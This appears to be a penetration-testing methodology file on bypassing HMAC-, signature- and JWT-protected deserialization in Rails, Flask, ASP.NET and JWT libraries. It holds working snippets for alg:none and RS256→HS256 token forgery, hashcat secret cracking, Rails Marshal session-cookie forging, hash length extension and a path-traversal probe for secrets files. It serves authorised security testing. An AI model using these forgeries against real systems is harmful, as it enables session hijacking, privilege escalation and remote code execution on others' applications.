# Signed / HMAC-Protected Deserialization Bypass

## Purpose

Test applications where serialized data is protected by an HMAC, digital signature, or encryption scheme that appears to prevent tampering — identifying weaknesses that allow payload forgery, key recovery, or algorithm confusion to bypass the integrity check and reach the deserialization sink.

## Applicability

- Any language/format where a cryptographic wrapper (HMAC, JWT, encrypt-then-MAC) surrounds a serialized blob
- Rails `CookieStore` sessions (HMAC-SHA1 with SECRET_KEY_BASE)
- ASP.NET ViewState with `EnableViewStateMac=true` and known/leaked machine key
- JWT tokens using `alg:none`, RS256→HS256 confusion, or weak secrets
- Custom binary protocols with prepended HMAC over a serialized payload
- Applications where the signing secret may be leaked via path traversal, error pages, or misconfiguration

## Preconditions

One or more of:
1. Signing secret is weak, default, or discoverable via brute-force
2. Secret is disclosed through error pages, config file exposure, backup files, or source code leakage
3. Algorithm confusion is possible (RS256 used as HS256; `alg:none` accepted)
4. MAC/signature check occurs after deserialization (verify-after-deserialize antipattern)
5. HMAC covers only part of the blob (length extension attack applicable)
6. Separate signing and deserialization keys, and signing key is weaker / disclosed

## Relevant Architecture

**Verify-then-deserialize (secure pattern — but secret must be unknown)**
```
Blob: <serialized-data> + <HMAC>
    → HMAC verification (using secret)
        ├─ pass → deserialize(data) → object graph
        └─ fail → reject
```

**Deserialize-then-verify (antipattern — exploitable regardless of secret)**
```
    → deserialize(data)         ← sink reached BEFORE verification
    → HMAC verification
```

**Secret disclosure → full bypass**
```
Config file / error page / .env leak → secret known
    → attacker computes valid HMAC for malicious payload
    → sends blob with valid signature → passes verification → RCE
```

## Technical Knowledge

**Common signing schemes and their weaknesses**

| Scheme | Weakness vector |
|--------|----------------|
| Rails itsdangerous / CookieStore | SECRET_KEY_BASE leak; HMAC-SHA1 over base64 payload |
| ASP.NET ViewState MAC | Machine key leak; `validationKey` in `web.config` |
| JWT RS256 → HS256 | Server public key used as HMAC secret |
| JWT `alg:none` | Some libraries accept unsigned tokens |
| JWT weak HS256 secret | Brute-forceable with hashcat/john |
| Custom HMAC-MD5 | Length extension if secret prepended |
| Django signing | `SECRET_KEY` leak; TimestampSigner separators |
| Flask itsdangerous | `SECRET_KEY` leak; algorithm downgrade in old versions |

**JWT algorithm confusion (RS256 → HS256)**
```python
# If server uses RS256, public key is available via JWKS endpoint
# If library accepts HS256 with arbitrary key, sign with the public key as HS256 secret
import jwt, requests

pub_key = requests.get("https://target/.well-known/jwks.json").json()
# Extract PEM-encoded public key from JWK

forged_token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    pub_key_pem,  # public key used as HS256 secret
    algorithm="HS256",
)
```

**JWT `alg:none` bypass**
```python
import base64, json

header = base64.urlsafe_b64encode(
    json.dumps({"alg": "none", "typ": "JWT"}).encode()
).rstrip(b"=")
payload = base64.urlsafe_b64encode(json.dumps({"sub": "admin"}).encode()).rstrip(b"=")
token = f"{header.decode()}.{payload.decode()}."  # empty signature
```

**JWT weak secret brute-force**
```bash
hashcat -a 0 -m 16500 <jwt-token> /usr/share/wordlists/rockyou.txt
# or
john --format=HMAC-SHA256 --wordlist=wordlist.txt jwt.txt
```

**Rails SECRET_KEY_BASE leak → session forge**
```ruby
# Once SECRET_KEY_BASE is known, forge Marshal session:
require 'openssl', 'base64'
payload = Base64.strict_encode64(Marshal.dump(gadget_object))
digest = OpenSSL::HMAC.hexdigest('SHA1', secret, payload)
cookie = "#{payload}--#{digest}"
```

**HMAC length extension (SHA1/SHA256 with secret-prefix MACs)**
```bash
# If MAC = HMAC(secret || data), can extend data without knowing secret
# Tool: hash_extender
./hash_extender --data <original-data> --secret-length <length> \
  --append <malicious-extension> --signature <original-mac> --format sha256
```

**verify-after-deserialize detection**
Test by sending a malformed signature with a valid-format payload:
- If application crashes or shows a deserialization error **before** a signature error → deserialize-before-verify
- If application returns a signature error immediately → verify-before-deserialize

## Indicators

**Black-box**
- Cookie/token in format `<base64-data>--<hex-or-base64-signature>` (Rails-style)
- JWT token (`eyJ...`) — examine `alg` header
- ViewState with `__VIEWSTATEGENERATOR` and `__VIEWSTATEMAC` hidden fields
- Error reveals key hint: `InvalidSignature`, `BadSignature`, `MacMismatch`, `CryptographicException: Padding invalid`
- Application returns different error types for signature failure vs. format failure (timing oracle)

**White-box**
```ruby
# Rails — session serializer with HMAC
verifier = ActiveSupport::MessageVerifier.new(secret_key_base)
session_data = verifier.verify(cookie_value)
Marshal.load(session_data)  # if serializer is Marshal

# Flask — signed cookie
from itsdangerous import URLSafeTimedSerializer
s = URLSafeTimedSerializer(app.secret_key)
data = s.loads(cookie_value)
pickle.loads(data)   # if custom serializer
```

## Interpretation

1. **`BadSignature` before deserialization error** → verify-before-deserialize; need the secret
2. **Deserialization error before `BadSignature`** → verify-after-deserialize (antipattern); sink reachable without valid signature
3. **Error changes when `alg:none` token sent** → JWT library may accept unsigned tokens
4. **Error references public key when HS256 token sent** → RS256→HS256 confusion worth testing
5. **Weak secret discovered via hashcat** → full forge capability; proceed to deserialize exploit

## Security-Relevant Conditions

- **verify-after-deserialize**: Signature is irrelevant; exploit the sink directly
- **Leaked secret** (any source): Full payload forgery — combine with appropriate deserialization approach
- **JWT `alg:none`**: Many older library versions accept this; test directly
- **Algorithm confusion (RS256→HS256)**: Common in Java JWT libraries (early `jjwt`, `nimbus-jose-jwt` < 7.9)
- **Length-extension MAC**: Custom HMAC-SHA1/256 schemes with secret prepended to data (not standard HMAC)
- **Timing difference**: If verify step takes different time for valid vs. invalid signatures, may indicate verify order

## Experiment Considerations

- Test verify-after-deserialize first — it requires no key material and directly confirms RCE path
- For JWT: always test `alg:none` and RS256→HS256 before attempting brute-force
- Secret brute-force: start with common defaults (framework-specific known defaults, empty string, `secret`, `changeme`)
- For Rails: check `.env`, `config/secrets.yml`, `config/credentials.yml.enc` (requires `master.key`), `config/database.yml` in error pages or known paths
- Combine with path traversal finding: `GET /../../config/secrets.yml` may disclose the key

## Evidence Expectations

1. Document the signature bypass method:
   - verify-after-deserialize: show that deserialization error precedes signature error
   - Secret obtained: show source of disclosure
   - Algorithm confusion: show the forged token accepted
2. Forged payload sent with valid (or bypassed) signature
3. OOB callback / bounded exec confirms RCE via underlying deserialization
4. Combine evidence from this approach with the relevant deserialization approach file

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| Consistent `BadSignature` before any format error | Verify-before-deserialize with strong unknown secret |
| Hashcat fails on JWT after wordlist + rules | Secret is strong random; not brute-forceable |
| `alg:none` rejected immediately | Library patched; try RS256→HS256 |
| RS256→HS256 confusion fails | Library validates algorithm matches key type |
| No config file disclosed | Secret not easily obtainable; pivot to other vuln classes |

## False Positives

- HMAC is verified before deserialization and secret is strong/unknown — effectively protected for this vector
- JWT uses RS256 with a correct implementation that rejects HS256 tokens — algorithm confusion blocked
- Rails `CookieStore` with strong SECRET_KEY_BASE not disclosed anywhere — signed sessions protected

## Limitations

- If the secret is strong and not disclosed, signed-state bypass requires another vulnerability (SSRF, path traversal, LFI) to obtain the key first
- verify-after-deserialize is rare but impactful; document the ordering proof carefully
- Length extension attacks require specific MAC construction (secret-prefix, non-HMAC); standard HMAC is not vulnerable
- JWT brute-force is computationally infeasible for 256-bit random secrets

## Related Knowledge

- `java-native` — underlying deserialization sink once signature is bypassed (Java)
- `python-pickle` — underlying sink in signed Flask/Celery sessions
- `ruby-marshal` — underlying sink in signed Rails sessions
- `dotnet-binaryformatter` — underlying sink in signed ViewState
- `second-order` — signed state stored and re-verified later may have different verification context
- JWT attack taxonomy: `alg:none`, RS256→HS256, `kid` injection, `jku`/`x5u` SSRF

## Tooling

```bash
# JWT analysis and forgery
pip install PyJWT --break-system-packages
python3 -c "
import jwt
# alg:none test
t = jwt.encode({'sub':'admin'}, '', algorithm='none')
print('alg:none:', t)
"

# JWT brute-force
hashcat -a 0 -m 16500 <token> rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt_hash.txt

# hash_extender for length-extension
./hash_extender --data <hex-data> --secret-length <n> \
  --append <hex-extension> --signature <hex-mac> --format sha256

# Rails session forge (after obtaining SECRET_KEY_BASE)
ruby -e "
require 'openssl'; require 'base64'
secret = ENV['SECRET_KEY_BASE']
# Build gadget object and Marshal.dump it
payload = Base64.strict_encode64('<marshal-payload-bytes>')
sig = OpenSSL::HMAC.hexdigest('SHA1', secret, payload)
puts \"#{payload}--#{sig}\"
"

# Test verify-after-deserialize ordering
# Send structurally valid payload with deliberately bad signature
# Observe whether deserialization error or signature error comes first
curl -b "session=<valid-format-bad-sig>" https://target/
```